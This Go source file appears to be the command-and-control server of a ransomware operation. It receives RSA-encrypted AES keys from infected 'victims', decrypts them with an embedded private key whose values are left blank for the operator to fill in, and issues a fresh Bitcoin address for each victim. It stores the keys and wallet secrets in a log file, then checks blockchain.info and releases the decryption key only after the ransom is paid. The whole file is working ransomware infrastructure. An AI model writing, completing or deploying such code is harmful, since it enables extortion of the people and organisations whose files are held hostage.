package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"net/url"
	"os"
	"strconv"

	"github.com/btcsuite/btcd/btcec"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/btcsuite/btcutil"
	"github.com/tkanos/gonfig"
)

func fromBase10(base10 string) *big.Int {
	i, ok := new(big.Int).SetString(base10, 10)
	if !ok {
		panic("bad number: " + base10)
	}
	return i
}

var Key rsa.PrivateKey

func init() {
	Key = rsa.PrivateKey{
		PublicKey: rsa.PublicKey{
			N: fromBase10(""), // modify this
			E: 65537,
		},
		D: fromBase10(""), // this too
		Primes: []*big.Int{
			fromBase10(""), // also this
			fromBase10(""), // yep, you have to take care of this too
		},
	}
	Key.Precompute()
}

type Network struct {
	name        string
	symbol      string
	xpubkey     byte
	xprivatekey byte
}

var network = map[string]Network{
	"rdd": {name: "reddcoin", symbol: "rdd", xpubkey: 0x3d, xprivatekey: 0xbd},
	"dgb": {name: "digibyte", symbol: "dgb", xpubkey: 0x1e, xprivatekey: 0x80},
	"btc": {name: "bitcoin", symbol: "btc", xpubkey: 0x00, xprivatekey: 0x80},
	"ltc": {name: "litecoin", symbol: "ltc", xpubkey: 0x30, xprivatekey: 0xb0},
}

func (network Network) GetNetworkParams() *chaincfg.Params {
	networkParams := &chaincfg.MainNetParams
	networkParams.PubKeyHashAddrID = network.xpubkey
	networkParams.PrivateKeyID = network.xprivatekey
	return networkParams
}

func (network Network) CreatePrivateKey() (*btcutil.WIF, error) {
	secret, err := btcec.NewPrivateKey(btcec.S256())
	if err != nil {
		return nil, err
	}
	return btcutil.NewWIF(secret, network.GetNetworkParams(), true)
}

func (network Network) ImportWIF(wifStr string) (*btcutil.WIF, error) {
	wif, err := btcutil.DecodeWIF(wifStr)
	if err != nil {
		return nil, err
	}
	if !wif.IsForNet(network.GetNetworkParams()) {
		return nil, errors.New("The WIF string is not valid for the `" + network.name + "` network")
	}
	return wif, nil
}

func (network Network) GetAddress(wif *btcutil.WIF) (*btcutil.AddressPubKey, error) {
	return btcutil.NewAddressPubKey(wif.PrivKey.PubKey().SerializeCompressed(), network.GetNetworkParams())
}

type Victim struct {
	priv_address string
	address      string
	key          []byte
}

type PaymentInfo struct {
	Address string
	Amount  string
}

type Configuration struct {
	Satoshi       int
	Confirmations int
}

var configuration = Configuration{}
var victims = map[string]Victim{}

func handler(w http.ResponseWriter, req *http.Request) {
	if req.URL.Path != "/key/" {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	switch req.Method {
	case "POST":
		err := req.ParseForm()
		if err != nil {
			panic(err)
		}

		key, err := hex.DecodeString(req.FormValue("key"))
		if err != nil {
			log.Println("[err] Unable to decode key string from hex.")
			return
		}

		id := req.FormValue("id")
		if id == "" {
			log.Println("[err] Got an empty id.")
			return
		}
		log.Println("Got a new key from", id, "! Decrypting it..")

		aes_key, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, &Key, key, nil)
		if err != nil {
			log.Println("[err] Unable to decrypt key.")
			return
		}
		log.Printf("Key decrypted succesfuly: %x\n", aes_key)

		wif, err := network["btc"].CreatePrivateKey()
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("Generated private address: %s\n", wif.String())

		address, err := network["btc"].GetAddress(wif)
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("Generated public address: %s\n", address.EncodeAddress())

		victims[id] = Victim{
			wif.String(),
			address.EncodeAddress(),
			aes_key,
		}
		json.NewEncoder(w).Encode(PaymentInfo{
			victims[id].address,
			strconv.Itoa(configuration.Satoshi),
		})
		log.Println("Payment information sent!")

		f, err := os.OpenFile("log.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
		if err != nil {
			log.Fatal(err)
		}
		defer f.Close()

		text := "ID: " + id + "\nAes Key: " + hex.EncodeToString(aes_key) + "\nPrivate Key: " + wif.String() + "\n\n"

		if _, err = f.WriteString(text); err != nil {
			log.Fatal(err)
		}
		log.Println("Successfully saved to file.")
	case "GET":
		keys, ok := req.URL.Query()["id"]
		if !ok || len(keys[0]) < 1 {
			log.Println("Url Param 'id' is missing")
			return
		}
		id := keys[0]

		if _, ok := victims[id]; !ok {
			log.Println("Invalid ID:", id)
			return
		}
		payload := url.Values{}
		payload.Set("confirmations", strconv.Itoa(configuration.Confirmations))

		resp, err := http.Get("https://blockchain.info/q/addressbalance/" + victims[id].address + "?" + payload.Encode())
		if err != nil {
			log.Fatal(err)
		}
		responseData, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		amount, err := strconv.Atoi(string(responseData))
		if err != nil {
			log.Fatal(err)
		}

		if amount >= configuration.Satoshi {
			log.Printf("Sending decryption key to: %s", id)
			fmt.Fprintf(w, hex.EncodeToString(victims[id].key))
		}
	default:
		fmt.Fprintf(w, "Sorry, only GET and POST methods are supported.")
	}
}

func main() {
	err := gonfig.GetConf("config.json", &configuration)
	if err != nil {
		log.Fatal(err)
	}
	http.HandleFunc("/key/", handler)

	log.Println("Starting server and listening on port 1337")
	log.Fatal(http.ListenAndServe(":1337", nil))
}
